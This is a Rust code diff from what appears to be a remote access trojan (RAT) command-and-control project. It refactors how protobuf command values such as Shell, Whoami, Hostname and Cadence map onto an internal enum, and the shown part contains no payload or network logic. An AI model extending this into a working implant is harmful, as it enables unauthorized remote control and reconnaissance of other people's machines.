@@ -1,3 +1,5 @@
+use crate::rat::RatCommand;
+
 pub mod rat {
     tonic::include_proto!("rat");
 }
@@ -34,20 +36,20 @@ impl From<RsRatCommand> for &str {
     }
 }
 
-// Way to convert from an i32 into the hacky copy of the protobuf
-impl From<i32> for RsRatCommand {
-    fn from(number: i32) -> Self {
-        match number {
-            0 => RsRatCommand::Cadence,
-            1 => RsRatCommand::Dir,
-            2 => RsRatCommand::Hostname,
-            3 => RsRatCommand::Ip,
-            4 => RsRatCommand::Ls,
-            6 => RsRatCommand::Os,
-            7 => RsRatCommand::Quit,
-            8 => RsRatCommand::Shell,
-            9 => RsRatCommand::Whoami,
-            _ => RsRatCommand::None
+// Way to convert from the protobuf enum into the hacky copy of the protobuf
+impl From<RatCommand> for RsRatCommand {
+    fn from(command: RatCommand) -> Self {
+        match command {
+            RatCommand::Cadence => RsRatCommand::Cadence,
+            RatCommand::Dir => RsRatCommand::Dir,
+            RatCommand::Hostname => RsRatCommand::Hostname,
+            RatCommand::Ip => RsRatCommand::Ip,
+            RatCommand::Ls => RsRatCommand::Ls,
+            RatCommand::None => RsRatCommand::None,
+            RatCommand::Os => RsRatCommand::Os,
+            RatCommand::Quit => RsRatCommand::Quit,
+            RatCommand::Shell => RsRatCommand::Shell,
+            RatCommand::Whoami => RsRatCommand::Whoami,
         }
     }
 }
